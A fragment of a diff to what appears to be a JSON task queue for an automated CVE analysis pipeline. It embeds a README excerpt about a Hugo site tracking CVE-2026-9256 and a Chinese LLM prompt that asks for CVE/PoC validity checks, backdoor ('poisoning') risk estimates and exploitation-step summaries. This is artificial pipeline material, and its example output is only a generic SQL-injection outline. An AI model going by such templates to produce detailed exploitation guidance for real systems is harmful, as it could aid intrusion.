`cve-2026-9256-tracker.png`\n  and feeds the OpenGraph / Twitter / RSS social image. Keep it;\n  `hiddenInSingle: true` keeps the image out of the rendered page body.\n\n## Update workflow\n\n1. Edit `site/content/_index.md` (or any file under `site/`).\n2. Optional: `cd site && hugo server` for a local live preview at\n   <http://localhost:1313/CVE-2026-9256/>.\n3. `make build` — emits to `site/public/` (gitignored).\n4. `make dist` — runs `make build`, then rsyncs `site/public/` to\n   `haig:.www/sites/kimmo.cloud/htdocs/CVE-2026-9256/` with `--delete`.\n\n## Social banner\n\nThe OpenGraph / social-preview image is **generated**, not hand-edited:\n\n- Source: `site/assets/cve-2026-9256-tracker.svg` (a 1200×630 SVG — the\n  standard OG size). Edit this.\n- Output: `site/static/cve-2026-9256-tracker.png`, produced by\n  `make banner` (which runs `resvg`). Hugo copies it from `static/`\n  into `public/` and PaperMod references it via the `cover:`\n  front-matter.\n\nThe PNG is committed so `make build` / `make dist` \n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
+    "retry_count": 0,
+    "max_retries": 5,
+    "priority": 2,
+    "status": "pending",
+    "error_type": null,
+    "last_error": null,
+    "created_at": 1781850266.1261106,
+    "last_attempt": 0,
+    "next_attempt": 1781850270.2562332,
+    "metadata": {},
+    "task_id": "task_CVE-2026-9256_1781850266",
     "required_result_fields": [
       "poc_available",
       "condition",
